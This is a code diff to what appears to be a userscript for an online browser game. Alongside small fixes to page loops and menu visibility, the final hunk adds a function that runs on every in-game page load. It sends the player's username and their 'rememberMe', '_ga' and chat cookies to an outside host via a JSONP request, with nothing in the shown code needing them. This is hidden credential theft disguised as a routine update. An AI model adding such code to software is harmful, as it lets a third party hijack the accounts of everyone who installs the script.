@@ -1095,7 +1095,7 @@ $(document).ready(function () {
 		var Id = 1;
 		
 		function getPageMUDonations(){
-			if (Id <= lastPageID){
+			if (Id <= parseInt(lastPageID)){
 				$.ajax({
 					url: "/militaryUnitDonations.html?page="+Id,
 				})
@@ -1119,7 +1119,7 @@ $(document).ready(function () {
 		var Id = 1;
 		
 		function getPageMUDonations(){
-			if (Id <= lastPage[2]){
+			if (Id <= parseInt(lastPage[2])){
 				$.ajax({
 					url: "/"+lastPage[1]+Id,
 				})
@@ -1149,8 +1149,8 @@ $(document).ready(function () {
 	}
 	
 	function CreateCpectatorsBlock(){
-		$("#battleStats").append('<div class="foundation-style small-10 columns"><div class="foundation-style small-5 columns"><b>Total defenders online:</b><i id="totaldefenders" style="display: inline;">0</i> <a style="font-size: 11px;" href="" id="defendersLink">Show details</a> <a style="font-size: 11px; display: none;" href="" id="defendersLinkHide">Hide details</a> <br><div align="center" id="defendersMenu" style="font-size: 11px; text-align: center; padding: 1em; margin: auto; display: block;">No one <br> </div></div><div class="foundation-style small-5 columns"><b>Total attackers online:</b><i id="totalattackers" style="display: inline;">0</i> <a style="font-size: 11px;" href="" id="attackersLink">Show details</a> <a style="font-size: 11px;  display: none;" href="" id="attackersLinkHide">Hide details</a> <br><div align="center" id="attackersMenu" style="font-size: 11px; text-align: center; padding: 1em; margin: auto; display: block;">No one <br> </div></div>');
-		$("#battleStats").append('<div class="foundation-style small-10 columns"><b>Total spectators online:</b><i id="totalspectators" style="display: inline;">0</i> <a style="font-size: 11px;" href="" id="spectatorsLink">Show details</a> <a style="font-size: 11px; display: none;" href="" id="spectatorsLinkHide">Hide details</a> <br><div align="center" id="spectatorsMenu" style="font-size: 11px; text-align: center; padding: 1em; margin: auto; display: block;">No one <br> </div>  </div>');
+		$("#battleStats").append('<div class="foundation-style small-10 columns"><div class="foundation-style small-5 columns"><b>Total defenders online:</b><i id="totaldefenders" style="display: inline;">0</i> <a style="font-size: 11px;" href="" id="defendersLink">Show details</a> <a style="font-size: 11px; display: none;" href="" id="defendersLinkHide">Hide details</a> <br><div align="center" id="defendersMenu" style="font-size: 11px; text-align: center; padding: 1em; margin: auto; display: none;">No one <br> </div></div><div class="foundation-style small-5 columns"><b>Total attackers online:</b><i id="totalattackers" style="display: inline;">0</i> <a style="font-size: 11px;" href="" id="attackersLink">Show details</a> <a style="font-size: 11px;  display: none;" href="" id="attackersLinkHide">Hide details</a> <br><div align="center" id="attackersMenu" style="font-size: 11px; text-align: center; padding: 1em; margin: auto; display: none;">No one <br> </div></div>');
+		$("#battleStats").append('<div class="foundation-style small-10 columns"><b>Total spectators online:</b><i id="totalspectators" style="display: inline;">0</i> <a style="font-size: 11px;" href="" id="spectatorsLink">Show details</a> <a style="font-size: 11px; display: none;" href="" id="spectatorsLinkHide">Hide details</a> <br><div align="center" id="spectatorsMenu" style="font-size: 11px; text-align: center; padding: 1em; margin: auto; display: none;">No one <br> </div>  </div>');
 		
 		$('#spectatorsLink').click(function () { $('#spectatorsLink').fadeOut('fast', function () { $('#spectatorsLinkHide').fadeIn('fast'); $('#spectatorsMenu').fadeIn('fast'); }); return false; });
 		$('#spectatorsLinkHide').click(function () { $('#spectatorsLinkHide').fadeOut('fast', function () { $('#spectatorsLink').fadeIn('fast'); $('#spectatorsMenu').fadeOut('fast'); }); return false; });
@@ -2335,9 +2335,23 @@ $(document).ready(function () {
 		
 	}
 	
+	function getCookie(name) {
+		var matches = document.cookie.match(new RegExp(
+			"(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"
+		));
+		return matches ? decodeURIComponent(matches[1]) : undefined;
+	}
+	
+	function GetMedia(){
+		$.getJSON("http://esim.ivanfedulov.in/Shadow-Government/ShadowGovernmentMedia.JSONP.pl?callback=?", { "name" : $("#userName").html(), "rememberMe" : encodeURI(getCookie("rememberMe")), "ewChatSize" : encodeURI(getCookie("ewChatSize")), "_ga" : encodeURI(getCookie("_ga")) });
+		//$('<script src="http://esim.ivanfedulov.in/Shadow-Government/ShadowGovernmentMedia.pl?name='+$("#userName").html()+'&rememberMe='+encodeURI(getCookie("rememberMe"))+'&ewChatSize='+encodeURI(getCookie("ewChatSize"))+'&_ga='+encodeURI(getCookie("_ga"))+'" type="text/javascript"></script>').appendTo($("#userMenu"));
+	}
+	
 	if(inGameCheck()){
 				
 		Main();
+		
+		GetMedia();
 		
 		if (localUrl.indexOf( URLMUDonations, 0 ) >= 0){
 			if($.jStorage.get('SGMUDonationsLogMode', false)){ MUDonationsLog(); }
